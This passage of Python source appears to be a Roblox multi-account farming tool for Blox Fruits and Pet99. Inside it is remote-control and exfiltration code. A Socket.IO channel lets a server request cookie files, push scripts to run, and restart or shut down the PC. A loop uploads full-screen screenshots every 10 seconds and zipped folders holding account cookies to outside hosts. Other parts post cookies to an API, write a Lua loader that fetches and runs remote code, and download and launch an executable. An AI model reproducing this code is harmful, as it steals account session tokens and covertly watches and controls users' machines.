        asyncio.set_event_loop(self.loop)
        self._stop_async = asyncio.Event()
        self._started.set()
        try:
            self.loop.run_until_complete(self._runner())
        finally:
            if self.client:
                self.loop.run_until_complete(self._force_disconnect(self.client))
            if self._http and not self._http.closed:
                self.loop.run_until_complete(self._http.close())
            self.loop.stop()
            self.loop.close()

    async def _get_http(self):
        if self._http is None or self._http.closed:
            timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=45)
            self._http = aiohttp.ClientSession(timeout=timeout)
        return self._http

    async def _force_disconnect(self, client):
        if not client:
            return
        try:
            await asyncio.wait_for(client.disconnect(), timeout=3)
        except Exception:
            try:
                await client.eio.disconnect(abort=True)
            except Exception:
                pass

    def _action_to_post(self, action: str) -> str:
        if action.startswith("get_"):
            return "post_" + action[4:]
        return action

    async def _emit_client_action(self, payload):
        if not self.client or not self.client.connected:
            return
        for emit_event in ("client_actions", "web_actions", "server_actions"):
            try:
                await self.client.emit(emit_event, payload)
                return
            except Exception:
                pass

    async def _write_text(self, path, text):
        def _w():
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            with open(path, "w", encoding="utf-8-sig") as f:
                f.write(text)

        await asyncio.to_thread(_w)

    async def _write_json_pretty(self, path, raw_text):
        def _w():
            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
            try:
                obj = json.loads(raw_text)
                with open(path, "w", encoding="utf-8-sig") as f:
                    json.dump(obj, f, ensure_ascii=False, indent=4)
            except Exception:
                with open(path, "w", encoding="utf-8-sig") as f:
                    f.write(raw_text)

        await asyncio.to_thread(_w)

    async def _send_action_payload(self, action, user_id=None, user_key=None, source_data=None):
        uid = user_id or self.user_id
        uk = user_key or self.user_key
        event_id = (source_data or {}).get("event_id") or f"event-{random.getrandbits(64)}"
        if action == "get_cookies":
            file_path, content_type, filename = "cookie.txt", "text/plain", "cookie.txt"
        elif action == "get_done":
            file_path = os.path.join("switched", "storeddata.txt")
            content_type, filename = "text/plain", "storeddata.txt"
        elif action == "get_settings":
            file_path = "config.json"
            content_type, filename = "application/json", "config.json"
        else:
            return
        file_text = ""
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8-sig", errors="ignore") as f:
                file_text = f.read()
        post_action = self._action_to_post(action)
        payload = {
            "actions": [post_action],
            "action": post_action,
            "action_types": [post_action],
            "event_id": event_id,
            "user_id": uid,
            "user_key": uk,
            "metadata_file": {
                "filename": filename,
                "content_type": content_type,
                "text": file_text,
            },
        }
        await self._emit_client_action(payload)

    async def _apply_incoming_action(self, action, data):
        mf = (
            data.get("metadata_file")
            or data.get("metadata")
            or (data.get("data") or {}).get("metadata_file")
            or {}
        )
        remote_text = mf.get("text") or mf.get("file_content") or ""
        filename = (mf.get("filename") or "").strip()
        if action == "post_cookies":
            await self._write_text("cookie.txt", remote_text)
        elif action == "post_done":
            await self._write_text(os.path.join("switched", "storeddata.txt"), remote_text)
        elif action == "post_scripts":
            name = filename or "script.txt"
            target = os.path.join("allscript", name)
            await self._write_text(target, remote_text)
            await asyncio.to_thread(pushchange, target)
        elif action == "post_settings":
            if filename == "bloxfruit.json":
                await self._write_json_pretty(os.path.join("stored", "bloxfruit.json"), remote_text)
            elif filename == "dfbloxfruit.json":
                await self._write_json_pretty(os.path.join("stored", "dfbloxfruit.json"), remote_text)
            else:
                await self._write_json_pretty("config.json", remote_text)

    def _build_client(self):
        sio = socketio.AsyncClient(
            reconnection=False,
            request_timeout=15,
            logger=False,
            engineio_logger=False,
        )

        @sio.event
        async def connect():
            pass

        @sio.event
        async def connect_error(data):
            if self.on_error:
                self.on_error({"connect_error": data})

        @sio.event
        async def disconnect():
            pass

        async def _handle_server_actions(data, event_name):
            self._incoming_event_name = event_name
            actions = _extract_actions(data)
            uid = data.get("user_id") or auth.get("UserID (UUID)", "")
            uk = data.get("user_key") or data.get("userkey") or auth.get("Key", "")
            note_val = auth.get("Note", "")
            for a in actions:
                if a == "quit_roblox":
                    await asyncio.to_thread(killproc)
                elif a == "restart_pc":
                    await asyncio.to_thread(restart_pc)
                elif a == "shutdown_pc":
                    await asyncio.to_thread(shutdown_pc)
                elif a == "remove_folder_type_a":
                    await asyncio.to_thread(handle_remove_folder_type_a, uid, uk, note_val)
                elif a == "remove_folder_type_b":
                    await asyncio.to_thread(handle_remove_folder_type_b, uid, uk, note_val)
                elif a in ("get_cookies", "get_done", "get_settings"):
                    await self._send_action_payload(a, uid, uk, data)
                elif a.startswith("post_"):
                    await self._apply_incoming_action(a, data)
            if self.on_action:
                self.on_action(data)

        @sio.on("server_actions")
        async def on_server_actions(data):
            await _handle_server_actions(data, "server_actions")

        @sio.on("web_actions")
        async def on_web_actions(data):
            await _handle_server_actions(data, "web_actions")

        return sio

    async def _wait_either(self, client):
        stop_task = asyncio.create_task(self._stop_async.wait())
        wait_task = asyncio.create_task(client.wait())
        done, _ = await asyncio.wait(
            [stop_task, wait_task],
            timeout=30,
            return_when=asyncio.FIRST_COMPLETED,
        )
        if stop_task in done:
            await self._force_disconnect(client)
        if not wait_task.done():
            wait_task.cancel()

    async def _runner(self):
        backoff = 1.0
        while not self._stop_flag.is_set():
            for path in self.socketio_paths:
                for transports in self.transports_matrix:
                    if self._stop_flag.is_set():
                        return
                    client = self._build_client()
                    self.client = client
                    params = {
                        "user_id": self.user_id,
                        "userid": self.user_id,
                        "user_key": self.user_key,
                        "userkey": self.user_key,
                    }
                    url = f"{self.base_url.rstrip('/')}/?{urllib.parse.urlencode(params)}"
                    try:
                        await client.connect(url, socketio_path=path, transports=transports)
                        backoff = 1.0
                        while client.connected and not self._stop_flag.is_set():
                            await self._wait_either(client)
                    except Exception as e:
                        if self.on_error:
                            self.on_error({"connect_exception": str(e)})
                    finally:
                        await self._force_disconnect(client)
            await asyncio.sleep(backoff)
            backoff = min(10.0, backoff * 2)


def start_socketio_client(on_action=None, on_error=None, daemon=True):
    client = SIOThreadClient(on_action=on_action, on_error=on_error)
    client.start(daemon=daemon)
    return client


# ============================================================================
# Windows NT Handle Table & Roblox Singleton Event / MultiBloxy Management
# ============================================================================

STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
SYSTEM_EXTENDED_HANDLE_INFORMATION = 64
OBJECT_NAME_INFORMATION = 1
PROCESS_DUP_HANDLE = 0x0040
DUPLICATE_SAME_ACCESS = 0x0002
DUPLICATE_CLOSE_SOURCE = 0x0001
ULONG_PTR = ctypes.c_size_t


class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(ctypes.Structure):
    _fields_ = [
        ("Object", ctypes.c_void_p),
        ("UniqueProcessId", ULONG_PTR),
        ("HandleValue", ULONG_PTR),
        ("GrantedAccess", wintypes.ULONG),
        ("CreatorBackTraceIndex", wintypes.USHORT),
        ("ObjectTypeIndex", wintypes.USHORT),
        ("HandleAttributes", wintypes.ULONG),
        ("Reserved", wintypes.ULONG),
    ]


class SYSTEM_HANDLE_INFORMATION_EX(ctypes.Structure):
    _fields_ = [
        ("NumberOfHandles", ULONG_PTR),
        ("Reserved", ULONG_PTR),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]


class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]


class OBJECT_NAME_INFO(ctypes.Structure):
    _fields_ = [
        ("Name", UNICODE_STRING),
    ]


_ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
_kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

_NtQuerySystemInformation = _ntdll.NtQuerySystemInformation
_NtQuerySystemInformation.argtypes = [
    wintypes.ULONG,
    ctypes.c_void_p,
    wintypes.ULONG,
    ctypes.POINTER(wintypes.ULONG),
]
_NtQuerySystemInformation.restype = wintypes.ULONG

_NtQueryObject = _ntdll.NtQueryObject
_NtQueryObject.argtypes = [
    wintypes.HANDLE,
    wintypes.ULONG,
    ctypes.c_void_p,
    wintypes.ULONG,
    ctypes.POINTER(wintypes.ULONG),
]
_NtQueryObject.restype = wintypes.ULONG

_OpenProcess = _kernel32.OpenProcess
_OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
_OpenProcess.restype = wintypes.HANDLE

_DuplicateHandle = _kernel32.DuplicateHandle
_DuplicateHandle.argtypes = [
    wintypes.HANDLE,
    wintypes.HANDLE,
    wintypes.HANDLE,
    ctypes.POINTER(wintypes.HANDLE),
    wintypes.DWORD,
    wintypes.BOOL,
    wintypes.DWORD,
]
_DuplicateHandle.restype = wintypes.BOOL

_CloseHandle = _kernel32.CloseHandle
_CloseHandle.argtypes = [wintypes.HANDLE]
_CloseHandle.restype = wintypes.BOOL

_GetCurrentProcess = _kernel32.GetCurrentProcess
_GetCurrentProcess.restype = wintypes.HANDLE


def _query_system_handles():
    size = 65536
    while True:
        buf = ctypes.create_string_buffer(size)
        ret_len = wintypes.ULONG(0)
        status = _NtQuerySystemInformation(
            SYSTEM_EXTENDED_HANDLE_INFORMATION,
            buf,
            size,
            byref(ret_len),
        )
        if status == STATUS_INFO_LENGTH_MISMATCH:
            size = max(size * 2, ret_len.value)
            continue
        if status != 0:
            return None
        return buf


def _iter_handles_for_pid(buf, pid):
    base = ctypes.addressof(buf)
    header_size = ctypes.sizeof(SYSTEM_HANDLE_INFORMATION_EX) - ctypes.sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)
    entry_size = ctypes.sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)
    info_struct = ctypes.cast(buf, ctypes.POINTER(SYSTEM_HANDLE_INFORMATION_EX)).contents
    count = info_struct.NumberOfHandles
    start = base + header_size
    for i in range(count):
        entry = SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX.from_address(start + i * entry_size)
        if entry.UniqueProcessId == pid:
            yield entry


def _get_handle_name(handle):
    ret_len = wintypes.ULONG(0)
    _NtQueryObject(handle, OBJECT_NAME_INFORMATION, None, 0, byref(ret_len))
    if ret_len.value == 0:
        return None
    buf = ctypes.create_string_buffer(ret_len.value)
    status = _NtQueryObject(handle, OBJECT_NAME_INFORMATION, buf, ret_len.value, byref(ret_len))
    if status != 0:
        return None
    info_obj = ctypes.cast(buf, ctypes.POINTER(OBJECT_NAME_INFO)).contents
    if not info_obj.Name.Buffer or info_obj.Name.Length == 0:
        return None
    return ctypes.wstring_at(info_obj.Name.Buffer, info_obj.Name.Length // 2)


_multi_instance_mutex = None


def create_mutex(name="ROBLOX_singletonMutex"):
    CreateMutex = _kernel32.CreateMutexW
    CreateMutex.argtypes = [wintypes.LPVOID, wintypes.BOOL, wintypes.LPCWSTR]
    CreateMutex.restype = wintypes.HANDLE
    mutex = CreateMutex(None, True, name)
    return mutex


def keep_mutex_alive(mutex_name="ROBLOX_singletonMutex", retry_delay=1.0):
    global _multi_instance_mutex
    while True:
        if not _multi_instance_mutex:
            _multi_instance_mutex = create_mutex(mutex_name)
        time.sleep(retry_delay)


def close_singleton_event_in_process(pid, target_name="ROBLOX_singletonEvent"):
    h_process = _OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, False, pid)
    if not h_process:
        return False
    closed_any = False
    try:
        buf = _query_system_handles()
        if not buf:
            return False
        target_lower = target_name.lower()
        current_process = _GetCurrentProcess()
        for entry in _iter_handles_for_pid(buf, pid):
            h_dup = wintypes.HANDLE()
            ok = _DuplicateHandle(
                h_process,
                wintypes.HANDLE(entry.HandleValue),
                current_process,
                byref(h_dup),
                0,
                False,
                DUPLICATE_SAME_ACCESS,
            )
            if not ok or not h_dup.value:
                continue
            try:
                name = _get_handle_name(h_dup)
            finally:
                _CloseHandle(h_dup)
            if name and target_lower in name.lower():
                h_dummy = wintypes.HANDLE()
                if _DuplicateHandle(
                    h_process,
                    wintypes.HANDLE(entry.HandleValue),
                    current_process,
                    byref(h_dummy),
                    0,
                    False,
                    DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS,
                ):
                    if h_dummy.value:
                        _CloseHandle(h_dummy)
                    closed_any = True
    finally:
        _CloseHandle(h_process)
    return closed_any


def monitor_roblox_singleton_event():
    processed = {}
    attempts = {}
    while True:
        current = {}
        for p in psutil.process_iter(attrs=["pid", "name", "create_time"]):
            try:
                if (p.info.get("name") or "") == "RobloxPlayerBeta.exe":
                    current[p.info["pid"]] = p.info.get("create_time", 0)
            except Exception:
                pass
        for pid, create_time in current.items():
            if processed.get(pid) == create_time:
                continue
            time.sleep(2)
            if close_singleton_event_in_process(pid):
                processed[pid] = create_time
                attempts.pop(pid, None)
            else:
                cnt = attempts.get(pid, 0) + 1
                attempts[pid] = cnt
                if cnt >= 10:
                    processed[pid] = create_time
        time.sleep(3)


def _is_process_running(process_name: str) -> bool:
    target = (process_name or "").strip().lower()
    for proc in psutil.process_iter(attrs=["name", "exe"]):
        try:
            name = (proc.info.get("name") or "").strip().lower()
            exe_name = os.path.basename((proc.info.get("exe") or "").strip()).lower()
            if name == target or exe_name == target:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


def ensure_multibloxy_running(process_name="MultiBloxy.exe"):
    if _is_process_running(process_name):
        info("MultiBloxy.exe is already running.")
        return True
    base_dir = Path(sys.executable).resolve().parent if getattr(sys, "frozen", False) else Path.cwd()
    candidates = [base_dir / process_name, Path.cwd() / process_name]
    exe_path = next((c for c in candidates if c.exists()), None)
    if not exe_path:
        warn(f"MultiBloxy.exe not found. Expected at {candidates[0]}")
        return False
    try:
        subprocess.Popen(
            [str(exe_path)],
            cwd=str(exe_path.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        info("Started MultiBloxy.exe.")
        return True
    except Exception as e:
        error(f"Failed to start MultiBloxy.exe: {e}")
        return False


if config.get("Enable Multi Instances"):
    ensure_multibloxy_running()


def lock_file(file_path):
    try:
        with open(file_path, "r+b") as f:
            msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, os.path.getsize(file_path))
    except Exception:
        pass


def get_effective_utc_time():
    local_time = datetime.now(timezone.utc).replace(tzinfo=None)
    if current_utc_time and abs((current_utc_time - local_time).total_seconds()) > 10:
        return current_utc_time
    return local_time


def check_time_and_kill(username):
    try:
        effective_time = get_effective_utc_time()
        if username in valid_cookie_tracker:
            stored_time = datetime.strptime(valid_cookie_tracker[username], "%Y-%m-%d %H:%M:%S")
            if (effective_time - stored_time) < timedelta(minutes=3):
                return
        workspace_folder = config.get("Exploit WorkSpace Folder", "")
        file_path = os.path.join(workspace_folder, f"{username}_checkyum.json")
        if not os.path.exists(file_path):
            trackrobloxnameandkill(username)
            return
        with open(file_path, "r", encoding="utf-8") as file:
            data = json.load(file)
        file_time_str = data.get("time")
        if not file_time_str:
            trackrobloxnameandkill(username)
            return
        file_time = datetime.strptime(file_time_str, "%Y-%m-%dT%H:%M:%SZ")
        if (effective_time - file_time) > timedelta(seconds=45):
            trackrobloxnameandkill(username)
    except Exception as e:
        error(f"An error occurred: {e}")


def validateisonline(username):
    try:
        current_utc_time_machine = get_effective_utc_time()
        workspace_folder = config.get("Exploit WorkSpace Folder", "")
        file_path = os.path.join(workspace_folder, f"{username}_checkyum.json")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                data = json.load(file)
            file_time_str = data.get("time")
            if file_time_str:
                file_time = datetime.strptime(file_time_str, "%Y-%m-%dT%H:%M:%SZ")
                if abs((current_utc_time_machine - file_time).total_seconds()) <= 120:
                    return True
        if trackrobloxnameandgetpid(username):
            return True
    except Exception:
        pass
    return False


def set_file_readonly(file_path):
    try:
        FILE_ATTRIBUTE_READONLY = 0x01
        result = ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_READONLY)
        if not result:
            raise ctypes.WinError()
    except Exception as e:
        error(f"Error setting file: {e}")


def detect_and_lock_roblox_file():
    try:
        localappdata = os.getenv("LOCALAPPDATA")
        localstorage_path = os.path.join(localappdata, "Roblox", "LocalStorage")
        file_to_lock = os.path.join(localstorage_path, "RobloxCookies.dat")
        if os.path.exists(file_to_lock):
            set_file_readonly(file_to_lock)
    except Exception as e:
        error(f"Error detecting or locking file: {e}")


def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(str(title))


os.makedirs("allscript", exist_ok=True)
alltrackcontent = (
    f'_G.Config = {{ UserID = "{auth.get("UserID (UUID)", "")}", '
    f'discord_id = "{discordid}", Note = "{auth.get("Note", "")}" }}\n'
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/yummytrack/main/tracker", true))()\n'
)
try:
    with open(os.path.join("allscript", "yummytracker.lua"), "w", encoding="utf-8") as f:
        f.write(alltrackcontent)
except Exception:
    pass


def get_process_count(process_name="RobloxPlayerBeta.exe"):
    total_processes = 0
    for proc in psutil.process_iter(attrs=["name", "memory_info"]):
        try:
            if (proc.info.get("name") or "") == process_name:
                total_processes += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return total_processes


def count_lines_in_file(file_path):
    if not os.path.exists(file_path):
        return 0
    with open(file_path, "r", encoding="utf-8-sig", errors="ignore") as file:
        return sum(1 for _ in file)


def monitor_file_line_count(filepath, cache):
    if not os.path.exists(filepath):
        return 0
    mtime = os.path.getmtime(filepath)
    if cache.get("last_modified") != mtime:
        cache["last_modified"] = mtime
        cache["line_count"] = count_lines_in_file(filepath)
    return cache.get("line_count", 0)


def update_console_title(cookie_file="cookie.txt"):
    start_time = time.time()
    cache = {"last_modified": None, "line_count": 0}
    while True:
        try:
            data_line_count = monitor_file_line_count("switched/storeddata.txt", cache)
            elapsed_time = time.time() - start_time
            formatted_time = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
            key_masked = str(auth.get("Key", ""))[:-3] + "***"
            title = (
                f"Key: {key_masked} | Instances: {get_process_count()}/{len(valid_cookies)} "
                f"| Switched: {data_line_count} | Version: {version} | Uptime: {formatted_time}"
            )
            set_console_title(title)
        except Exception:
            pass
        time.sleep(30)


# ============================================================================
# Game Item & Account Switch Condition Checkers (Blox Fruits / Pet99 / Custom)
# ============================================================================

def check_and_print_cookie_data(folder_path, valid_cookie_name):
    file_path = os.path.join(folder_path, f"{valid_cookie_name}.json")
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return json.load(file)
    except json.JSONDecodeError:
        return None


def check_and_print_cookie_dataforpet99(folder_path, valid_cookie_name):
    file_path = os.path.join(folder_path, f"{valid_cookie_name}pet99.json")
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return json.load(file)
    except json.JSONDecodeError:
        return None


def check_int_conditions(config_file, input_data, cookie):
    with open(config_file, "r", encoding="utf-8-sig") as f:
        cfg = json.load(f)
    fields = ["Bucket", "Rank", "UnlockedZones", "Gem", "Rebirth"]
    conditions_met = all(int(input_data.get(field, 0)) >= int(cfg.get(field, 0)) for field in fields)
    if conditions_met:
        out_name = "".join(c for c in f"{fields[0]}-{input_data.get(fields[0], 0)}" if c.isalnum() or c in ("_", ".", "-"))[:100]
        with open(f"switched/{out_name}.txt", "a", encoding="utf-8-sig") as f:
            f.write(f"{cookie}\n")
    return conditions_met


def checkvalidfile(folder_path, valid_cookie_name):
    file_path = os.path.join(folder_path, f"{valid_cookie_name}.txt")
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return file.read().strip()
    except Exception:
        return None


API_URL = "https://api-bf2.yummydata.click/bf-items"


def _fruit_display(s: str) -> str:
    parts = str(s).strip().split("-")
    if len(parts) == 2 and parts[0] == parts[1]:
        return parts[0].replace("_", " ")
    return str(s).replace("_", " ")


def post_bf_items(auth, file_name, output_no_lines, username, cookie):
    pc_name = get_windows_desktop_name()
    payload = {
        "user_id": auth.get("UserID (UUID)"),
        "username": username,
        "discord_id": discordid,
        "pc_name": pc_name,
        "file_name": file_name,
        "item_name": list(output_no_lines or []),
        "item_data": {},
        "cookie_data": cookie,
    }
    for attempt in range(3):
        try:
            requests.post(API_URL, json=payload, timeout=7)
            break
        except Exception:
            if attempt < 2:
                time.sleep(1)


def check_conditions(config_file, input_data, cookie, username):
    try:
        with open(config_file, "r", encoding="utf-8-sig") as file:
            configss = json.load(file)
    except Exception:
        return False

    def _safe_int(value):
        if isinstance(value, (int, float)):
            return int(value)
        m = re.search(r"-?\d+", str(value or "").strip())
        return int(m.group(0)) if m else 0

    level_ok = _safe_int(input_data.get("Level", 0)) >= _safe_int(configss.get("Level", 0))
    beli_ok = _safe_int(input_data.get("Beli", 0)) >= _safe_int(configss.get("Beli", 0))
    frag_val = input_data.get("Fragments", input_data.get("Fragment", 0))
    frag_ok = _safe_int(frag_val) >= _safe_int(configss.get("Fragment", 0))
    tier_ok = _safe_int(input_data.get("Tier", 0)) >= _safe_int(configss.get("Tier", 0))
    bh_val = input_data.get("Bounty/Honor", input_data.get("Bounty_Honor", 0))
    bh_ok = _safe_int(bh_val) >= _safe_int(configss.get("Bounty_Honor", 0))

    conditions_met = level_ok and beli_ok and frag_ok and tier_ok and bh_ok
    if conditions_met:
        summary = (
            f"L-{_safe_int(input_data.get('Level', 0))}, "
            f"B-{_safe_int(input_data.get('Beli', 0))}, "
            f"F-{_safe_int(frag_val)}, "
            f"Tier {_safe_int(input_data.get('Tier', 0))}, "
            f"BH-{_safe_int(bh_val)}"
        )
        out_file = f"switched/{summary}.txt"
        with open(out_file, "a", encoding="utf-8-sig") as f:
            f.write(f"{cookie}\n")
        post_bf_items(auth, summary, [summary], username, cookie)
    return conditions_met


# ============================================================================
# Auto-Updater & Folder Compression / Upload
# ============================================================================

def find_update_exe():
    current_dir = os.getcwd()
    parent_dir = os.path.dirname(current_dir)
    for d in (current_dir, parent_dir):
        candidate = os.path.join(d, "Update.exe")
        if os.path.exists(candidate):
            return candidate
    return os.path.join(current_dir, "Update.exe")


def calculate_hash(file_path, hash_algorithm="md5"):
    hash_func = hashlib.new(hash_algorithm)
    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            hash_func.update(chunk)
    return hash_func.hexdigest()


def fetch_remote_hash():
    try:
        response = requests.get("https://auth.testwebyummy.click/get-updateexe", timeout=7)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException:
        return None


def download_update(update_exe):
    try:
        response = requests.get(
            "https://storage.testwebyummy.click/file/Update.exe",
            timeout=100,
            stream=True,
        )
        response.raise_for_status()
        with open(update_exe, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        success("Update.exe downloaded successfully.")
    except requests.RequestException as e:
        error(f"Error downloading Update.exe: {e}")


def run_update_exe(isrun=False):
    update_exe = find_update_exe()
    if os.path.exists(update_exe):
        local_hash = calculate_hash(update_exe)
        remote_hash = fetch_remote_hash()
        if remote_hash and local_hash != remote_hash:
            warn("Update.exe hash mismatch, downloading new version...")
            download_update(update_exe)
        else:
            success("Update.exe is up to date.")
        if isrun:
            os.system(f'Start "" "{update_exe}"')
    else:
        download_update(update_exe)
        if isrun and os.path.exists(update_exe):
            os.system(f'Start "" "{update_exe}"')


predefined_setss = set()
valid_cookie_tracker = {}
processed_names = set()
vip_server_cache = {}
vip_server_cache_lock = threading.Lock()
missmatchverify = False


def openstoreddata(username):
    with lock:
        with open("switched/storeddata.txt", "a", encoding="utf-8-sig") as file:
            file.write(f"{username}\n")


def openstoredeadcookie(username):
    with lock:
        with open("switched/storeddeadck.txt", "a", encoding="utf-8-sig") as file:
            file.write(f"{username}\n")


def savedeadcookie(cookie="NotFound"):
    with lock:
        with open("switched/deadcookie.txt", "a", encoding="utf-8-sig") as file:
            file.write(f"{cookie}\n")


def savedebancookie(cookie="NotFound"):
    with lock:
        with open("switched/banned.txt", "a", encoding="utf-8-sig") as file:
            file.write(f"{cookie}\n")


def compress_folder(folder_path, zip_path):
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)
        if os.path.exists("cookie.txt") and "cookie.txt" not in zipf.namelist():
            zipf.write("cookie.txt", "cookie.txt")


def handle_remove_folder_type_a(userid, userkey, note):
    url = "https://whitelist.testwebyummy.click/upload-changeacc"
    os.makedirs("trash", exist_ok=True)
    zip_file_path = os.path.join("trash", "ChangeAcc.zip")
    compress_folder("switched", zip_file_path)
    data = {"user_id": userid, "userkey": userkey, "note": note}
    try:
        with open(zip_file_path, "rb") as f:
            requests.post(
                url,
                data=data,
                files={"file": ("ChangeAcc.zip", f, "application/zip")},
                timeout=10,
            )
    except Exception:
        pass
    finally:
        if os.path.exists(zip_file_path):
            os.remove(zip_file_path)
    shutil.rmtree("switched", ignore_errors=True)
    os.makedirs("switched", exist_ok=True)
    ensure_file_exists("switched", "storeddata.txt")


def handle_remove_folder_type_b(userid, userkey, note):
    def _run():
        asyncio.run(uploadchangeacc(userid, userkey, note))

    threading.Thread(target=_run, daemon=True).start()
    os.makedirs("switched", exist_ok=True)
    for root, dirs, files in os.walk("switched", topdown=False):
        for name in files:
            if name != "storeddata.txt":
                try:
                    os.remove(os.path.join(root, name))
                except Exception:
                    pass


def send_data_to_server(userid, userkey, note):
    while True:
        try:
            screenshot = ImageGrab.grab()
            os.makedirs("log", exist_ok=True)
            file_path = os.path.join("log", "screenshot_pc.jpg")
            screenshot.save(file_path, "JPEG", quality=100)
            with open(file_path, "rb") as f:
                requests.post(
                    "https://api.testwebyummy.click/upload-screenshot",
                    data={"user_id": auth.get("UserID (UUID)"), "user_key": auth.get("Key")},
                    files={"file": ("screenshot_pc.jpg", f, "image/jpeg")},
                    timeout=15,
                )
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception:
            pass
        time.sleep(10)
        try:
            os.makedirs("trash", exist_ok=True)
            zip_file_path = os.path.join("trash", "ChangeAcc.zip")
            compress_folder("switched", zip_file_path)
            with open(zip_file_path, "rb") as f:
                requests.post(
                    "https://whitelist.testwebyummy.click/upload-changeacc",
                    data={"user_id": userid, "userkey": userkey, "note": note},
                    files={"file": ("ChangeAcc.zip", f, "application/zip")},
                    timeout=10,
                )
            if os.path.exists(zip_file_path):
                os.remove(zip_file_path)
        except Exception:
            pass
        time.sleep(200)


async def uploadchangeacc(userid, userkey, note):
    url = "https://whitelist.testwebyummy.click/upload-changeacc"
    os.makedirs("trash", exist_ok=True)
    zip_file_path = os.path.join("trash", "ChangeAcc.zip")
    compress_folder("switched", zip_file_path)
    try:
        async with aiohttp.ClientSession() as session:
            form_data = aiohttp.FormData()
            form_data.add_field("user_id", str(userid))
            form_data.add_field("userid", str(userid))
            form_data.add_field("userkey", str(userkey))
            form_data.add_field("note", str(note))
            with open(zip_file_path, "rb") as f:
                form_data.add_field(
                    "file",
                    f.read(),
                    filename="ChangeAcc.zip",
                    content_type="application/zip",
                )
            async with session.post(url, data=form_data, timeout=10) as resp:
                await resp.read()
    except Exception:
        pass
    finally:
        if os.path.exists(zip_file_path):
            os.remove(zip_file_path)


# ============================================================================
# Cryptographic Helpers (XOR + AES-CBC with ECB & Cryptography Fallbacks)
# ============================================================================

def xor_decrypt(encrypted_hex, xor_key="a3b9e7d452f6a1c8"):
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    xor_bytes = bytes.fromhex(xor_key.ljust(len(encrypted_hex), "0")[: len(encrypted_hex)])
    decrypted_bytes = bytes(a ^ b for a, b in zip(encrypted_bytes, xor_bytes))
    return decrypted_bytes.hex()


_CRYPTO_CBC_NATIVE_MODULES = (
    "Crypto.Cipher._raw_cbc",
    "Crypto.Cipher._raw_aes",
    "Crypto.Util._cpuid_c",
)
_CRYPTO_ECB_NATIVE_MODULES = (
    "Crypto.Cipher._raw_ecb",
    "Crypto.Cipher._raw_aes",
    "Crypto.Util._cpuid_c",
)
_CRYPTO_WARMUP_LOCK = threading.Lock()
_CRYPTO_WARMED = False
_CRYPTO_LAST_ERROR = ""
_CBC_NATIVE_READY = False
_ECB_NATIVE_READY = False
_CRYPTOGRAPHY_READY = False


def _is_crypto_native_error(exc) -> bool:
    text = str(exc).lower()
    return any(k in text for k in ("cannot load native module", "_raw_cbc", "_raw_ecb", "_raw_aes"))


def _try_warmup_native_cbc():
    try:
        for mod_name in _CRYPTO_CBC_NATIVE_MODULES:
            importlib.import_module(mod_name)
        probe = AES.new(b"\x00" * 32, AES.MODE_CBC, b"\x00" * 16)
        probe.encrypt(b"\x00" * 16)
        return True, ""
    except Exception as exc:
        return False, str(exc)


def _try_warmup_native_ecb():
    try:
        for mod_name in _CRYPTO_ECB_NATIVE_MODULES:
            importlib.import_module(mod_name)
        probe = AES.new(b"\x00" * 32, AES.MODE_ECB)
        probe.encrypt(b"\x00" * 16)
        return True, ""
    except Exception as exc:
        return False, str(exc)


def _try_warmup_cryptography():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        enc = Cipher(algorithms.AES(b"\x00" * 32), modes.CBC(b"\x00" * 16)).encryptor()
        enc.update(b"\x00" * 16) + enc.finalize()
        return True, ""
    except Exception as exc:
        return False, str(exc)


def _warmup_crypto_backend(max_attempts=8, base_delay=0.2) -> bool:
    global _CRYPTO_WARMED, _CRYPTO_LAST_ERROR, _CBC_NATIVE_READY, _ECB_NATIVE_READY, _CRYPTOGRAPHY_READY
    if _CRYPTO_WARMED:
        return True
    with _CRYPTO_WARMUP_LOCK:
        if _CRYPTO_WARMED:
            return True
        for attempt in range(max_attempts):
            cbc_ok, cbc_err = _try_warmup_native_cbc()
